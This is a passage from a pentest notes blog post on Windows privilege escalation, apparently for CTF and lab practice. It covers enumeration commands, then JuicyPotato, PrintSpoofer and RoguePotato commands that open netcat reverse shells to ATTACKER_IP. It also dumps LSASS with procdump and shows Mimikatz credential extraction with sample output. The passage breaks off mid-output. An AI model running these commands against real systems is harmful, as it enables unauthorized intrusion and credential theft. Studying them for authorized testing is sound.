<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Notes Windows Privilege Escalation" /><meta name="author" content="BatBato" /><meta property="og:locale" content="en" /><meta name="description" content="Windows Privilege Escalation" /><meta property="og:description" content="Windows Privilege Escalation" /><link rel="canonical" href="nouman404.github.io/Notes/Privilege_Escalation/Windows_PE" /><meta property="og:url" content="nouman404.github.io/Notes/Privilege_Escalation/Windows_PE" /><meta property="og:site_name" content="BatBato’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-02T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Notes Windows Privilege Escalation" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@BatBato" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"BatBato"},"dateModified":"2023-12-06T09:25:32+01:00","datePublished":"2022-09-02T00:00:00+02:00","description":"Windows Privilege Escalation","headline":"Notes Windows Privilege Escalation","mainEntityOfPage":{"@type":"WebPage","@id":"nouman404.github.io/Notes/Privilege_Escalation/Windows_PE"},"url":"nouman404.github.io/Notes/Privilege_Escalation/Windows_PE"}</script><title>Notes | Windows Privilege Escalation | BatBato's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BatBato's Blog"><meta name="application-name" content="BatBato's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BatBato's Blog</a></div><div class="site-subtitle font-italic">BatBato was here :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/notes/" class="nav-link"> <i class="fa-fw fas fa-sticky-note ml-xl-3 mr-xl-3 unloaded"></i> <span>NOTES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fas fa-folder-open ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Nouman404" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/235762" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/Batbato" aria-label="tryhackme" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href="https://www.root-me.org/BatBato" aria-label="rootme" target="_blank" rel="noopener"> <i class="fas fa-skull"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Notes | Windows Privilege Escalation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Notes | Windows Privilege Escalation</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1662069600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 2, 2022 </em> </span> <span> Updated <em class="" data-ts="1701851132" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 6, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Bat </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4282 words"> <em>23 min</em> read</span></div></div></div><div class="post-content"><h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1><p>As with the Linux operating system, a misconfigured Windows machine can allow an attacker to gain <code class="language-plaintext highlighter-rouge">Administrator</code> or <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code> rights. While the <code class="language-plaintext highlighter-rouge">Administrator</code> is a user on any Windows machine, <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>, often called <code class="language-plaintext highlighter-rouge">SYSTEM</code>, is an account that has the most rights but to which you cannot log in with credentials.</p><blockquote class="prompt-danger"><div><p>For reading purpose, I won’t tell if we are using a <code class="language-plaintext highlighter-rouge">CMD</code> console when running a command but will display a command that uses <code class="language-plaintext highlighter-rouge">Powershell</code> like <code class="language-plaintext highlighter-rouge">PS&gt; COMMAND</code>.</p></div></blockquote><h2 id="network-information-gathering"><span class="mr-2">Network Information Gathering</span><a href="#network-information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="ipconfig"><span class="mr-2">IPconfig</span><a href="#ipconfig" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>As for a Linux machine, we may want to check for the network of the machine. We can print information about its internet network with the command <code class="language-plaintext highlighter-rouge">ipconfig</code> :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w">
</span></pre></table></code></div></div><p>This will allow us to know if there is more than one network interface which can be leveraged to access a computer on a sub-network.</p><h3 id="arp"><span class="mr-2">ARP</span><a href="#arp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can use the <code class="language-plaintext highlighter-rouge">arp</code> command to check for other computers on the network like this :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">arp</span><span class="w"> </span><span class="nt">-a</span><span class="w">
</span></pre></table></code></div></div><h3 id="routing-table"><span class="mr-2">Routing Table</span><a href="#routing-table" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The routing table can show us what routes can packages take on the network :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w">
</span></pre></table></code></div></div><h3 id="netstat"><span class="mr-2">Netstat</span><a href="#netstat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The <code class="language-plaintext highlighter-rouge">netstat</code> command can show us if there is any service running on the machine that may be leveraged :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">
</span></pre></table></code></div></div><h3 id="windows-defender--applocker-rules"><span class="mr-2">Windows Defender &amp; AppLocker Rules</span><a href="#windows-defender--applocker-rules" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To display information about <code class="language-plaintext highlighter-rouge">Windows Defender</code> or the <code class="language-plaintext highlighter-rouge">AppLocker</code> rules we can run the followinf commands :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-MpComputerStatus</span><span class="w">
</span></pre></table></code></div></div><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Effective</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">RuleCollections</span><span class="w">
</span></pre></table></code></div></div><hr /><h2 id="basic-enumeration"><span class="mr-2">Basic Enumeration</span><a href="#basic-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It’s important to have information about the computer we are attacking. Like on Linux, we can, for example, list the running processes with the <code class="language-plaintext highlighter-rouge">tasklist</code> command :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">tasklist</span><span class="w"> </span><span class="nx">/svc</span><span class="w">
</span></pre></table></code></div></div><h3 id="system-information"><span class="mr-2">System information</span><a href="#system-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can list environment variables with the <code class="language-plaintext highlighter-rouge">set</code> command. With the <code class="language-plaintext highlighter-rouge">systeminfo</code> we can get a lot of information about the computer we are in like the host name, the OS Version, the type of processor used…</p><p>To see if a machine is up to date, we can look to its <code class="language-plaintext highlighter-rouge">hotfixes</code> with the following command and by checking the Microsoft website:</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w">
</span></pre></table></code></div></div><p>or</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-HotFix</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nt">-AutoSize</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>You can search for a specific <code class="language-plaintext highlighter-rouge">hotfix</code> <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808">here</a></p></div></blockquote><p>We can look at the path variables like this :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">PATH</span><span class="o">%</span><span class="w">
</span></pre></table></code></div></div><h4 id="program-installed"><span class="mr-2">Program installed</span><a href="#program-installed" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We can check for non-standard applications that may have been installed by a user or an administrator :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">wmic</span><span class="w"> </span><span class="nx">product</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span></pre></table></code></div></div><p>or</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">Win32_Product</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Version</span><span class="w">
</span></pre></table></code></div></div><h4 id="rpc"><span class="mr-2">RPC</span><a href="#rpc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>A user can connect to a machine with the RPC protocol. We can look if another user is connected on our machine with the <code class="language-plaintext highlighter-rouge">query user</code> command. If you want to know how to impersonate this user check <a href="https://nouman404.github.io/Notes/Footprinting/Common_Services_Enumeration_&amp;_Attacks#rdp-session-hijacking">this part of my blog</a>.</p><h3 id="current-user-privileges"><span class="mr-2">Current User Privileges</span><a href="#current-user-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When we arrive on a machine we may want to know which user we are or what are our rights. To check our user we can use the <code class="language-plaintext highlighter-rouge">whoami</code> or the <code class="language-plaintext highlighter-rouge">echo %USERNAME%</code> command. To see which rights our user has we can run the command <code class="language-plaintext highlighter-rouge">whoami /priv</code> and if we are a classic user we may get this output.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">

</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="o">----------------------</span><span class="w">

</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">========</span><span class="w">
</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Disabled</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>As you can see, we have some privileges that are disabled. You can enable them all using <a href="https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1">this script</a> or <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">this one</a>. First enable the script <code class="language-plaintext highlighter-rouge">Import-Module .\EnableAllTokenPrivs.ps1</code> and then run it <code class="language-plaintext highlighter-rouge">.\EnableAllTokenPrivs.ps1</code>.</p></div></blockquote><p>We may want to check which group we are in because we can inherit privileges from certain.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
</span></pre></table></code></div></div><p>We may also want to look for other users with the <code class="language-plaintext highlighter-rouge">net user</code> command or the list of all groups with this <code class="language-plaintext highlighter-rouge">net localgroup</code> command. To get information about a certain group you can use <code class="language-plaintext highlighter-rouge">net localgroup GROUP_TO_CHECK</code>.</p><hr /><h2 id="exploit-user-rights"><span class="mr-2">Exploit User Rights</span><a href="#exploit-user-rights" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="seimpersonate--seassignprimarytoken"><span class="mr-2">SeImpersonate &amp; SeAssignPrimaryToken</span><a href="#seimpersonate--seassignprimarytoken" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Every process in Windows has a token that contains details about the account that is operating it. Since these tokens are merely memory addresses that can be brute-forced by users who are unable to access memory, they are not thought of as secure resources. The <code class="language-plaintext highlighter-rouge">SeImpersonate</code> privilege is required to use the token. Only administrator accounts are granted access to it, and in most circumstances, it can be taken away during system hardening.</p><p>We are going to use <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> that can be used to exploit the <code class="language-plaintext highlighter-rouge">SeImpersonate</code> or <code class="language-plaintext highlighter-rouge">SeAssignPrimaryToken</code> privileges via DCOM/NTLM reflection abuse. Start a netcat listener on your attacker machine and then launch this command :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">c:\tools\JuicyPotato.exe</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">53375</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">c:\windows\system32\cmd.exe</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="s2">"/c c:\tools\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>You may get issues if you don’t put the full path of a file.</p></div></blockquote><blockquote class="prompt-info"><div><p>Note that we are using a <code class="language-plaintext highlighter-rouge">cmd</code> reverse shell but we can of course use <code class="language-plaintext highlighter-rouge">powershell</code> instead.</p></div></blockquote><blockquote class="prompt-warning"><div><p>If you are not running the exploit from a running process like an SQL server. You may need to add the <code class="language-plaintext highlighter-rouge">-c</code> flag. Then add a value, depending on the machine you are on, from <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">here</a>. If the first value doesn’t work try the second, then the third… until it works.</p></div></blockquote><p>Where <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> doesn’t work <code class="language-plaintext highlighter-rouge">Windows Server 2019</code> and <code class="language-plaintext highlighter-rouge">Windows 10 build 1809</code> onwards, <a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> and <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> do work.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">c:\tools\PrintSpoofer.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd"</span><span class="w">
</span></pre></table></code></div></div><p>or</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">c:\tools\RoguePotato.exe</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">ATTACKER_IP</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="s2">"c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd"</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">LISTENING_PORT</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Note that we are using a <code class="language-plaintext highlighter-rouge">cmd</code> reverse shell but we can of course use <code class="language-plaintext highlighter-rouge">powershell</code> instead.</p></div></blockquote><h3 id="sedebugprivilege"><span class="mr-2">SeDebugPrivilege</span><a href="#sedebugprivilege" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Instead of adding the account to the administrators group, a user may be given the <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> to run a specific program or service or help with troubleshooting. To leverage this privilege we can dump process memory. The <code class="language-plaintext highlighter-rouge">Local Security Authority Subsystem Service</code> (LSASS) process is a good target. We can do it with the GUI or with the command line. With the GUI, you will need to launch the <code class="language-plaintext highlighter-rouge">Task Manager</code>, go to the <code class="language-plaintext highlighter-rouge">Details</code> section and find the <code class="language-plaintext highlighter-rouge">lsass.exe</code> process. When found, you can right click on it and select <code class="language-plaintext highlighter-rouge">Create dump file</code>. The command for the command line is :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">procdump.exe</span><span class="w"> </span><span class="nt">-accepteula</span><span class="w"> </span><span class="nt">-ma</span><span class="w"> </span><span class="nx">lsass.exe</span><span class="w"> </span><span class="nx">lsass.dmp</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">procdump.exe</code> may not be installed by default but you can install it from the <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump">Windows website</a></p></div></blockquote><p>Now that we have the lsass dump (<code class="language-plaintext highlighter-rouge">lsass.dmp</code>), we can run <a href="https://www.kali.org/tools/mimikatz/">Mimikatz</a> (you can also use the <a href="https://github.com/ParrotSec/mimikatz">github repo</a>).</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">mimikatz.exe</span><span class="w">
</span></pre></table></code></div></div><p>When on Mimikatz, we will try to dump password hashes :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="n">mimikatz</span><span class="w"> </span><span class="c"># log</span><span class="w">
</span><span class="kr">Using</span><span class="w"> </span><span class="s1">'mimikatz.log'</span><span class="w"> </span><span class="kr">for</span><span class="w"> </span><span class="n">logfile</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">OK</span><span class="w">

</span><span class="n">mimikatz</span><span class="w"> </span><span class="c"># sekurlsa::minidump lsass.dmp</span><span class="w">
</span><span class="kr">Switch</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nx">MINIDUMP</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s1">'lsass.dmp'</span><span class="w">

</span><span class="n">mimikatz</span><span class="w"> </span><span class="c"># sekurlsa::logonpasswords</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Authentication</span><span class="w"> </span><span class="nx">Id</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">23026942</span><span class="w"> </span><span class="p">(</span><span class="mi">00000000</span><span class="p">:</span><span class="mi">015</span><span class="n">f5cfe</span><span class="p">)</span><span class="w">
</span><span class="n">Session</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">RemoteInteractive</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">bob</span><span class="w">
</span><span class="n">Domain</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">WIN-TEST</span><span class="w">
</span><span class="n">Logon</span><span class="w"> </span><span class="nx">Server</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">WIN-TEST</span><span class="w">
</span><span class="n">Logon</span><span class="w"> </span><span class="nx">Time</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">9/2/2022</span><span class="w"> </span><span class="nx">2:59:52</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">SID</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-3769161915-3336846931-3985975925-1000</span><span class="w">
        </span><span class="n">msv</span><span class="w"> </span><span class="p">:</span><span class="w">
         </span><span class="p">[</span><span class="mi">00000003</span><span class="p">]</span><span class="w"> </span><span class="n">Primary</span><span class="w">
         </span><span class="o">*</span><span class="w"> </span><span class="nx">Username</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">bob</span><span class="w">
         </span><span class="o">*</span><span class="w"> </span><span class="n">Domain</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">WIN-TEST</span><span class="w">
